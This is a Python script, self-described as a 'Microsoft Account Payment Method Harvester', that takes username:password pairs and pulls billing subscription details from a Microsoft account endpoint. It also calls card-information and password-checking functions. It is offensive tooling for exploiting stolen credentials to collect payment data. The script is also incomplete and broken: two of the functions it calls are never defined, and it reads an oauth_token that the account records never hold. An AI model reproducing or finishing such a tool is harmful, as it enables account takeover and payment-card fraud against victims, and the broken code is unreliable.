import requests
import json
import time
import re
import base64
import hashlib
import hmac
import urllib
import sys
import argparse
import threading
import queue
import os
import subprocess

def _get_subscription_info(account):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }

    url = f'https://account.microsoft.com/billingagreements/subscriptions'
    params = {
        'api-version': '1.0',
        'oauth_token': account['oauth_token']
    }

    response = requests.get(url, headers=headers, params=params)
    response.raise_for_status()

    data = response.json()
    subscriptions = data['value']

    for subscription in subscriptions:
        subscription_id = subscription['id']
        subscription_name = subscription['displayName']
        subscription_status = subscription['state']
        subscription_billing_cycle = subscription['billingCycle']
        subscription_next_billing_date = subscription['nextBillingDate']
        subscription_current_billing_period = subscription['currentBillingPeriod']
        subscription_current_billing_amount = subscription['currentBillingAmount']
        subscription_currency = subscription['currency']

        print(f"Subscription ID: {subscription_id}")
        print(f"Subscription Name: {subscription_name}")
        print(f"Subscription Status: {subscription_status}")
        print(f"Subscription Billing Cycle: {subscription_billing_cycle}")
        print(f"Next Billing Date: {subscription_next_billing_date}")
        print(f"Current Billing Period: {subscription_current_billing_period}")
        print(f"Current Billing Amount: {subscription_current_billing_amount}")
        print(f"Currency: {subscription_currency}\n")

def _start(accounts):
    for account in accounts:
        _check_password(account)
        _get_card_info(account)
        _get_subscription_info(account)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Microsoft Account Payment Method Harvester')
    parser.add_argument('-a', '--accounts', type=str, nargs='+', help='Microsoft Accounts (username:password)')
    args = parser.parse_args()

    if not args.accounts:
        print("Please provide Microsoft Accounts (username:password) as arguments.")
        sys.exit(1)

    accounts = []
    for account in args.accounts:
        username, password = account.split(':')
        accounts.append({'username': username, 'password': password})

    _start(accounts)